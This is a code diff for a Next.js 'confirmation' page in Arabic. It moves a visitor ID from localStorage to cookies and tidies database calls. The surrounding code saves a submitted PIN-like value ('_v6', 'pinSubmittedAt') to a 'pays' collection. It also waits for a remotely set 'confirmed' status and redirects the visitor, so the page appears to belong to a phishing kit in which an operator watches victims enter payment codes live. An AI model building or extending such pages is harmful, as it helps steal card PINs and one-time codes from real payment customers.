@@ -8,10 +8,11 @@ import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Lock, AlertCircle, ShieldCheck, Eye, Smartphone } from "lucide-react";
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner";
 import { StepShell } from "@/components/step-shell";
-import { db } from "@/lib/supabase-client";
-import { doc, setDoc, onSnapshot, Firestore } from "@/lib/supabase-client";
+import { db, doc, setDoc, onSnapshot } from "@/lib/supabase-client";
 import { addToHistory } from "@/lib/history-utils";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 export default function ConfiPage() {
   const router = useRouter();
@@ -26,7 +27,7 @@ export default function ConfiPage() {
   const [isConfirming, setIsConfirming] = useState(false);
 
   useEffect(() => {
-    const id = localStorage.getItem("visitor") || "";
+    const id = getCookie("visitor") || "";
     setVisitorId(id);
   }, []);
 
@@ -36,7 +37,7 @@ export default function ConfiPage() {
     if (!visitorId || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorId),
+      doc("pays", visitorId),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data();
@@ -64,14 +65,14 @@ export default function ConfiPage() {
   }, [router, visitorId]);
 
   useEffect(() => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID) {
       router.push("/home-new");
       return;
     }
 
     if (!db) return;
-    const docRef = doc(db as Firestore, "pays", visitorID);
+    const docRef = doc("pays", visitorID);
     const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
       if (!docSnapshot.exists()) {
         router.push("/check");
@@ -127,7 +128,7 @@ export default function ConfiPage() {
     setIsConfirming(true);
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorId),
+        doc("pays", visitorId),
         { _v6Status: "confirmed" },
         { merge: true },
       );
@@ -143,7 +144,7 @@ export default function ConfiPage() {
       return;
     }
 
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID) {
       setError("حدث خطأ. يرجى المحاولة مرة أخرى.");
       return;
@@ -152,9 +153,9 @@ export default function ConfiPage() {
     setIsSubmitting(true);
 
     try {
-      if (!db) throw new Error("Supabase client is not configured");
+      if (!db) throw new Error("Database client is not configured");
       await setDoc(
-        doc(db as Firestore, "pays", visitorID),
+        doc("pays", visitorID),
         {
           _v6,
           pinSubmittedAt: new Date().toISOString(),
